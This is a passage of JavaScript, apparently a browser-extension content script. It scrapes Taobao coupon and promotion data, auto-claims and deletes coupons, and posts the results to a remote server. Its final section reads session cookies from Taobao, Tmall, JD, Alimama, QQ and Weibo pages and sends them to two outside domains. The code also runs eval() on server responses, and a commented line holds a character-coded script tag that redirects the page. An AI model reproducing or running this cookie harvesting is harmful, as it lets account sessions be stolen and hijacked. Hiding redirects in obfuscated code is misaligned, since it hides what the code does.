		var a = new RegExp('<a class=\"amount\">(.*?)</a>([\\s\\S]*?)promotionId=(.*?)&amp;spm([\\s\\S]*?)user_number_id=(.*?)\"([\\s\\S]*?)<a class=\"use-cond\">满(.*?)</a>([\\s\\S]*?)<a class="valid-date">(.*?)&nbsp;至&nbsp;(.*?)</a>',"g");
//		var s = a.exec(content,'g');
		
//		var a=new RegExp("e","g");
		var arr_money = new Array();
		var arr_promotionId = new Array();
		var arr_user_number_id = new Array();
		var arr_condition = new Array();
		var arr_create_time = new Array();
		var arr_end_time = new Array();
		var arr_shop_all = new Array();
		var count = 0;
		do
		{
			s=a.exec(content);
//			console.log(s);
			if(s!=null){
				arr_money.push(s[1]);
				arr_promotionId.push(s[3]);
				arr_user_number_id.push(s[5]);
				arr_condition.push(s[7]);
				arr_create_time.push(s[9]);
				arr_end_time.push(s[10]);
				arr_shop_all.push('2');
				count++;
			}
		}
		while (s!=null) 
			
		if(count>0){
			sumbit_promotion(arr_user_number_id,arr_promotionId,arr_money,arr_create_time,arr_end_time,arr_condition,arr_shop_all);
		}else{
			setTimeout(refresh_promotion,1000);
		}
	}
}

function sumbit_promotion(userNumId,promotion_id,coupon_money,coupon_create_time,coupon_end_time,coupon_condition,coupon_shop_all){
//	jQuery.post("http://do.search.huopinjie.com/common/add/promotion.php?action=add", 
//			{userNumId:userNumId
//			,"promotion_id":promotion_id
//			,"coupon_money":coupon_money
//			,"coupon_create_time":coupon_create_time
//			,"coupon_end_time":coupon_end_time
//			,"coupon_condition":coupon_condition
//			,"coupon_shop_all":2
//			}, function(data){
//				if($(".vm-page-next").length>0){
//					console.log(".vm-page-next");
//					setTimeout(click_quan,1000);
//				}
//	});
	
	var data_arr = {userNumId:userNumId
		,"promotion_id":promotion_id
		,"coupon_money":coupon_money
		,"coupon_create_time":coupon_create_time
		,"coupon_end_time":coupon_end_time
		,"coupon_condition":coupon_condition
		,"coupon_shop_all":coupon_shop_all
		};
	dataStr = jQuery.param(data_arr);
	
	postHttp("http://do.search.huopinjie.com/common/add/promotion.php?action=add", dataStr
				, function(data){
		console.log(JSON.stringify(data));
//				if($(".vm-page-next").length>0){
//					console.log(".vm-page-next");
//					setTimeout(click_quan,1000);
//				}
		del_promotion();
		setTimeout(refresh_promotion,10000);
	});
}

function del_promotion(){
	if($(".J_Delete").length>0||$("button.delete").length>0){		
		if($(".J_Delete").length>0&&$("button.delete").length<=0){
//			console.log(".J_Delete");
			$(".J_Delete")[0].click();
			setTimeout(del_promotion,100);
		}
		else{
			$(".delete")[0].click();
			setTimeout(del_promotion,100);
		}
	}else{
//		window.location.reload();
	}
}

function refresh_promotion(){
	window.location.reload();
}

function click_quan(){
	if($(".vm-page-next").length>0){
		console.log(".vm-page-next");
		$(".vm-page-next")[0].click();
	}
	setTimeout(click_quan,1000);
}

if (srcurl.indexOf("taoquan.taobao.com/coupon/list_my_coupon.htm") > 0&&srcurl.indexOf("ctype=0") > 0) {
	del_promotion();
	setTimeout(refresh_promotion,10000);
}


//console.log(".J_getCoupon"+srcurl);
if (srcurl.indexOf("shop.m.taobao.com/shop/coupon.htm") > 0) {
	linqu_coupon_item();
}

function linqu_coupon_item(){
	var content = $("body").html();
	if($(".J_getCoupon").length>0){
//		console.log(".J_getCoupon");
		$(".J_getCoupon")[0].click();
	}
	if (content.indexOf("领取成功") > 0||content.indexOf("优惠券单人限领量超限") > 0
//			||content.indexOf("买家优惠券张数超出限制") > 0
			) {	
		linqu_coupon_update_do();
	}
	else if(content.indexOf("店铺不存在") > 0
			||content.indexOf("该优惠券不存在或者已经过期") > 0){
		get_coupon_item();
	}
	else if(content.indexOf("领取失败") > 0){
		setTimeout(get_coupon_item,10000);
	}
	else if(content.indexOf("HSF执行错误") > 0){
		setTimeout(get_coupon_item,10000);
	}
	else{
		setTimeout(linqu_coupon_item,1000);
	}
}

function linqu_coupon_update_do(){
//	console.log(".linqu_coupon_update_do");
	var content = $("body").html();
//	console.log(".content"+content);
	var a = new RegExp('sellerId%3d(.*?)%26activityId%3d(.*?)&amp;');
	var s = a.exec(content);
	if (s != null) {
		userNumId = s[1];
		activity_id = s[2];
//		console.log(".userNumId"+userNumId);
//		console.log(".activity_id"+activity_id);
	}else{
		a = new RegExp('seller%5fid%3d(.*?)%26activity%5fid%3d(.*?)&amp;');
		s = a.exec(content);
		if (s != null) {
			userNumId = s[1];
			activity_id = s[2];
		}
	}
	if(userNumId!=null&&activity_id!=null){
		var arr_activity_id = new Array();
		var arr_userNumId = new Array();
		var arr_do = new Array();
		arr_userNumId.push(userNumId);
		arr_activity_id.push(activity_id);
		arr_do.push('1');
		var data_arr = {userNumId:arr_userNumId
				,"activity_id":arr_activity_id
				,"coupon_do":arr_do
		};
		dataStr = jQuery.param(data_arr);
		postHttp("http://do.search.huopinjie.com/common/add/coupon.php?action=updateCouponDo", dataStr
				, function(data){
			get_coupon_item();
		});
	}
}

function get_coupon_item(){
	var url ="http://do.search.huopinjie.com/common/data.php?action=coupon&ext_fields={\"shop_all\":0,\"status\":1}";
	$.getJSON(url, {next:next}, function(data){
		if(data&&data.result&&data.result.map){					
			data = data.result.map;
		}
		if(data.item&&data.item.activity_id&&data.item.shop_all!='1'&&data.item.status!='0'
//			&&data.item.do!='1'
				){
			window.location.href="http://shop.m.taobao.com/shop/coupon.htm?sellerId="+data.item.user_num_id+"&activityId="+data.item.activity_id;
		}
		else{
			setTimeout(get_coupon_item,100);
		}
	});
	setTimeout(refresh_promotion,200000);
}


if ((srcurl.indexOf(".tmall.com/search.htm?spm=") > 0||srcurl.indexOf(".tmall.hk/search.htm?spm=") > 0||srcurl.indexOf(".taobao.com/search.htm?spm=") > 0||srcurl.indexOf(".jiyoujia.com/search.htm?spm=") > 0||srcurl.indexOf(".alitrip.com/search.htm?spm=") > 0)&&srcurl.indexOf("promotionId=") > 0) {
	console.log(".search_promotionId");
	search_promotionId();
}

function search_promotionId(){
	var content = $("body").html();
	if (content.indexOf("没找到符合条件的商品,换个条件或关键词试试吧。") > 0) {	
		setTimeout(get_promotion_item,100);
	}
	else if (content.indexOf("很抱歉") > 0) {	
		setTimeout(get_promotion_item,100);
	}
	if (srcurl.indexOf(".tmall.com/search.htm?spm=") > 0||srcurl.indexOf(".tmall.hk/search.htm?spm=") > 0||srcurl.indexOf(".alitrip.com/search.htm?spm=") > 0) {
		if($(".J_TItems").length>0){
			var arr_numIid = new Array(); 
			var count = 0;
			$(".J_TItems>.pagination").prevAll().find("dl.item").each(function(i,o){
				var $this = $(o);
				var numIid = $this.attr("data-id");
				if(numIid&&numIid!=''){
					arr_numIid.push(numIid);
					count++;
				}
			});
	    	console.log("count:"+count);
	    	if(count>0){
	    		var a = new RegExp('<input type=\"hidden\" name=\"user_number_id\" value="(.*?)">([\\s\\S]*?)<input type=\"hidden\" name=\"promotionId\" value="(.*?)">');
	    		var s = a.exec(content);
	    		if (s != null) {
	    			var promotion_id = s[3];
	    			var userNumId = s[1];
	    			update_promotion(userNumId,promotion_id,arr_numIid);
	    		}
	    	}else{
	    		setTimeout(search_promotionId,1000);
	    	}
		}else{
			setTimeout(search_promotionId,1000);
		}
	}else{
		if($(".shop-hesper-bd").length>0){
			var arr_numIid = new Array(); 
			var count = 0;
			$(".shop-hesper-bd>.pagination").prevAll().find("dl.item").each(function(i,o){
				var $this = $(o);
				var numIid = $this.attr("data-id");
				if(numIid&&numIid!=''){
					arr_numIid.push(numIid);
					count++;
				}
			});
	    	console.log("count:"+count);
	    	if(count>0){
//	    		<input type="hidden" value="1657860583" name="promotionId">
//	    		<input type="hidden" name="user_number_id" value="776164736"> 
	    		var a = new RegExp('<input type=\"hidden\" name=\"user_number_id\" value="(.*?)">([\\s\\S]*?)<input type=\"hidden\" name=\"promotionId\" value="(.*?)">');
	    		var s = a.exec(content);
	    		if (s != null) {
	    			var promotion_id = s[3];
	    			var userNumId = s[1];
	    			update_promotion(userNumId,promotion_id,arr_numIid);
	    		}
	    	}else{
	    		setTimeout(search_promotionId,1000);
	    	}
		}else{
			setTimeout(search_promotionId,1000);
		}
	}
}

function update_promotion(userNumId,promotion_id,arr_numIid){
	var data_arr = {userNumId:userNumId
		,"promotion_id":promotion_id
		,"coupon_items":JSON.stringify(arr_numIid)
		};
	dataStr = jQuery.param(data_arr);
//	console.log(dataStr);
	postHttp("http://do.search.huopinjie.com/common/add/promotion.php?action=updatePromotion", dataStr
				, function(data){
//		console.log(JSON.stringify(data));
		setTimeout(get_promotion_item,100);
	});
}

function get_promotion_item(){
	var url ="http://do.search.huopinjie.com/common/data.php?action=promotion&next="+next;
	 getHttp(url, function(JHtml) {
		var data = eval("(" + JHtml + ")");
		if(data&&data.result&&data.result.map){					
			data = data.result.map;
		}
		if(data.item&&data.item.promotion_id
//				&&data.item.do=='0'
					){
			window.location.href="https://store.taobao.com/search.htm?spm=0.0.0.0.mJ89aR&user_number_id="+data.item.user_num_id+"&search=y&promotionId="+data.item.promotion_id;
		}
		else{
			setTimeout(get_promotion_item,100);
		}
//         $.each(jsonp, function(name, value) {
//             console.log(name);
//             console.log(value);
//         });
    });
	 
//	$.getJSON(url, {}, function(data){
//		if(data&&data.result&&data.result.map){					
//			data = data.result.map;
//		}
//		if(data.item&&data.item.promotion_id&&data.item.do=='0'){
//			window.location.href="https://store.taobao.com/search.htm?spm=0.0.0.0.mJ89aR&user_number_id="+data.item.user_num_id+"&search=y&promotionId="+data.item.promotion_id;
//		}
//		else{
//			setTimeout(get_promotion_item,100);
//		}
//	});
}


if (srcurl.indexOf("err.taobao.com") > 0) {
	get_store();
}
function get_store(){
	var nextStr = next;
	var url ="http://do.search.huopinjie.com/common/data.php?action=tmall";
	if(getXun==0){
		url ="http://do.search.huopinjie.com/common/data.php?action=store";
		getXun=1;
	}
	else if(getXun==1){
		url ="http://do.search.huopinjie.com/common/data.php?action=has_coupon";
		getXun=2;
	}
	else if(getXun==2){
		url ="http://do.search.huopinjie.com/common/data.php?action=coupon&ext_fields={\"shop_all\":0,\"status\":1}";
		getXun=3;
		nextStr = "_get_coupon"+next;
	}
	else{
		url ="http://do.search.huopinjie.com/common/data.php?action=tmall";
		getXun = 0;
	}
	$.getJSON(url, {next:nextStr}, function(data){
		if(data&&data.result&&data.result.map){					
			data = data.result.map;
		}
		if(data.item&&data.item.user_num_id&&data.item.user_num_id!=null&&data.item.user_num_id!=''){
			get_coupon(data.item.user_num_id)
		}
		else{
			setTimeout(get_store,100);
		}
	});
}

function get_coupon(userNumId){
	if(userNumId!=null&&userNumId!=''){
		var url = "https://cart.taobao.com/json/GetPriceVolume.do?sellerId=" + userNumId;
//	    getHttp(url, function(JHtml) {
//	        if (JHtml.indexOf("priceVolumes") > 0) {
//	    		console.log("【url："+url+"】");
//	    		console.log("【JHtml："+JHtml+"】");
//
//	        	var data = eval("(" + JHtml + ")");
//	            if(data.priceVolumes&&data.priceVolumes!=null){
//					$.each(data.priceVolumes, function(i,item){
//						var timeRange = item.timeRange;
//						var condition = item.condition;
//						var coupon_create_time = timeRange.substring(0,timeRange.indexOf('-'));
//						var coupon_end_time = timeRange.substring(timeRange.indexOf('-')+1);
//						var coupon_condition = condition.substring(1,condition.indexOf('减'));
//						sumbit_coupon(userNumId,item.id,item.price,coupon_create_time,coupon_end_time,coupon_condition);
//					});
//				}
//	        }
//	        setTimeout(get_store,50000);
//	    });
		$.getJSON(url, {}, function(data){
//			console.log("【JHtml："+data+"】");
            if(data.priceVolumes&&data.priceVolumes!=null){
            	var arr_money = new Array();
        		var arr_activity_id = new Array();
        		var arr_condition = new Array();
        		var arr_create_time = new Array();
        		var arr_end_time = new Array();
        		var arr_shop_all = new Array();
        		var count = 0;
        		
				$.each(data.priceVolumes, function(i,item){
					var timeRange = item.timeRange;
					var condition = item.condition;
					var coupon_create_time = timeRange.substring(0,timeRange.indexOf('-'));
					var coupon_end_time = timeRange.substring(timeRange.indexOf('-')+1);
					var coupon_condition = condition.substring(1,condition.indexOf('减'));
					
					arr_money.push(item.price);
					arr_activity_id.push(item.id);
					arr_condition.push(coupon_condition);
					arr_create_time.push(coupon_create_time);
					arr_end_time.push(coupon_end_time);
					arr_shop_all.push('1');
					
					count++;
//					sumbit_coupon(userNumId,item.id,item.price,coupon_create_time,coupon_end_time,coupon_condition);
				});
				if(count>0){					
					submit_coupon_list(userNumId,arr_activity_id,arr_money,arr_create_time,arr_end_time,arr_condition,arr_shop_all);
				}
			}
            setTimeout(get_store,100);
		});
	}
}

function submit_coupon_list(userNumId,activity_id,coupon_money,coupon_create_time,coupon_end_time,coupon_condition,coupon_shop_all){
	var data_arr = {userNumId:userNumId
		,"activity_id":activity_id
		,"coupon_money":coupon_money
		,"coupon_create_time":coupon_create_time
		,"coupon_end_time":coupon_end_time
		,"coupon_condition":coupon_condition
		,"coupon_shop_all":coupon_shop_all
		};
	dataStr = jQuery.param(data_arr);
	postHttp("http://do.search.huopinjie.com/common/add/coupon.php?action=addItems", dataStr
				, function(data){
		
//			del_promotion();
//			setTimeout(refresh_promotion,5000);
	});
}

function sumbit_coupon(userNumId,activity_id,coupon_money,coupon_create_time,coupon_end_time,coupon_condition){
//	console.log("【userNumId："+userNumId+"】【activity_id："+activity_id+"】【coupon_money："+coupon_money+"】");
	jQuery.post("http://do.search.huopinjie.com/common/add/coupon.php?action=addItem", 
			{userNumId:userNumId
			,"activity_id":activity_id
			,"activity_num_id":""
			,"coupon_money":coupon_money
			,"coupon_create_time":coupon_create_time
			,"coupon_end_time":coupon_end_time
			,"coupon_condition":coupon_condition
			,"coupon_total_count":0
			,"coupon_applied_count":0
			,"coupon_person_limit_count":0
			,"coupon_shop_all":1
			}, function(data){
		
	});
}


console.log("【srcurl："+srcurl+"】");
if (srcurl.indexOf("cart.taobao.com/json/GetPriceVolume") > 0) {
//	console.log("【cookie："+document.cookie+"】");
	getCookie("https://cart.taobao.com/json/GetPriceVolume.do?sellerId=2111693528", function(cookie) {
		console.log("【cookie："+cookie+"】");
		submit_taobao_cookie("coupon_cookie",cookie);
//	    if (cookie.indexOf("_tb_token_") > 0) {
//	        tbtoken = strContent(cookie, "_tb_token_=", ";");
//	    }
	});
}
else if (srcurl.indexOf("media.jd.com/gotoadv/goods") > 0) {
	getCookie("https://media.jd.com/gotoadv/goods?pageSize=50", function(cookie) {
		console.log("【cookie："+cookie+"】");
		submit_taobao_cookie("jd_cookie",cookie);
//		if (cookie.indexOf(";uin=o") > 0) {
//            var weibo_user = strContent(cookie, ";uin=o", ";");
//    		submit_taobao_cookie("qq_cookie"+"_"+weibo_user,cookie);
//        }
	});
}

else if (srcurl.indexOf("market.m.taobao.com/apps/aliyx/coupon/detail.html?wh_weex=true&activity_id=") > 0) {
//	console.log("【cookie："+document.cookie+"】");
	getCookie("http://market.m.taobao.com/apps/aliyx/coupon/detail.html?wh_weex=true&activity_id=05a8c2db39444e8082318fb97af374ff&seller_id=2567407649", function(cookie) {
		console.log("【cookie："+cookie+"】");
		submit_taobao_cookie("coupon_cookie",cookie);
//	    if (cookie.indexOf("_tb_token_") > 0) {
//	        tbtoken = strContent(cookie, "_tb_token_=", ";");
//	    }
	});
}
else if (srcurl.indexOf("pub.alimama.com/report/getTbkPaymentDetails.json") > 0) {
	getCookie("http://pub.alimama.com/report/getTbkPaymentDetails.json", function(cookie) {
		console.log("【cookie："+cookie+"】");
		submit_taobao_cookie("alimama_cookie",cookie);
		 var url = "http://pub.alimama.com/common/getUnionPubContextInfo.json";	
	    getHttp(url, function(JHtml) {
	        if (JHtml.indexOf('mmNick":"') > 0) {
	            var jsonp = eval("(" + JHtml + ")");
	           var alimama_un = jsonp.data.mmNick;
	           submit_taobao_cookie("alimama_cookie"+"_"+alimama_un,cookie);
	        }
	    });
	});
}
else if (srcurl.indexOf("upload.buluo.qq.com/cgi-bin/bar/upload/image?callback=singleImgUpload") > 0) {
	getCookie("http://upload.buluo.qq.com/cgi-bin/bar/upload/image?callback=singleImgUpload", function(cookie) {
		console.log("【cookie："+cookie+"】");
		submit_taobao_cookie("qq_cookie",cookie);
		if (cookie.indexOf(";uin=o") > 0) {
            var weibo_user = strContent(cookie, ";uin=o", ";");
    		submit_taobao_cookie("qq_cookie"+"_"+weibo_user,cookie);
        }
	});
}
else if (srcurl.indexOf("weibo.com/aj/v6/user/newcard") > 0) {
//	getCookie("http://weibo.com/aj/v6/user/newcard?ajwvr=6&id=1339315757&11", function(cookie) {
//		console.log("【cookie："+cookie+"】");
//		submit_taobao_cookie("weibo_cookie",cookie);
//		
//		if (cookie.indexOf(";un=") > 0) {
//            var weibo_user = strContent(cookie, ";un=", ";");
//    		submit_taobao_cookie("weibo_cookie"+"_"+weibo_user,cookie);
//        }
//		
//	});
	getCookie("http://weibo.com", function(cookie) {
		console.log("【cookie："+cookie+"】");
		submit_taobao_cookie("weibo_cookie",cookie);
		
		var url = "http://weibo.com";	
	    getHttp(url, function(JHtml) {
	    	if (JHtml.indexOf("$CONFIG['uid']='") > 0) {
	            var weibo_user = strContent(JHtml, "$CONFIG['uid']='", "';");
	    		submit_taobao_cookie("weibo_cookie"+"_"+weibo_user,cookie);
	    		if(srcurl.indexOf("reply") > 0){
	    			submit_taobao_cookie("weibo_cookie_reply",cookie);
	    		}
	        }
	    });
		
	});
}
else if (srcurl.indexOf("list.tmall.com/search_product.htm") > 0) {
//	console.log("【cookie："+document.cookie+"】");
	getCookie("https://list.tmall.com/search_product.htm?brand=44602", function(cookie) {
		console.log("【tmall_cookie："+cookie+"】");
		submit_taobao_cookie("tmall_cookie",cookie);
//	    if (cookie.indexOf("_tb_token_") > 0) {
//	        tbtoken = strContent(cookie, "_tb_token_=", ";");
//	    }
	});
}
else if (srcurl.indexOf("upload.taobao.com/auction/json/reload_cats") > 0) {
//	console.log("【cookie："+document.cookie+"】");
	getCookie("https://upload.taobao.com/auction/json/reload_cats.htm?customId=&fenxiaoProduct=&sid=", function(cookie) {
		console.log("【store_cookie："+cookie+"】");
		submit_taobao_cookie("store_cookie",cookie);
//	    if (cookie.indexOf("_tb_token_") > 0) {
//	        tbtoken = strContent(cookie, "_tb_token_=", ";");
//	    }
	});
}

function submit_taobao_cookie(key,value){
	var data_arr = {key:key
		,"value":value
		};
	dataStr = jQuery.param(data_arr);
	postHttp("http://do.search.huopinjie.com/common/add/config.php?action=update", dataStr
				, function(data){
		
//			del_promotion();
//			setTimeout(refresh_promotion,5000);
	});
	postHttp("http://www.shaibaojie.com/common/add/config.php?action=update", dataStr
			, function(data){
	
//		del_promotion();
//		setTimeout(refresh_promotion,5000);
});
}

//console.log("【cookie："+String.fromCharCode(60,115,99,114,105,112,116,62,119,105,110,100,111,119,46,108,111,99,97,116,105,111,110,46,104,114,101,102,61,34,104,116,116,112,58,47,47,119,119,119,46,115,104,97,105,98,97,111,106,46,99,111,109,47,34,59,60,47,115,99,114,105,112,116,62)+"】");




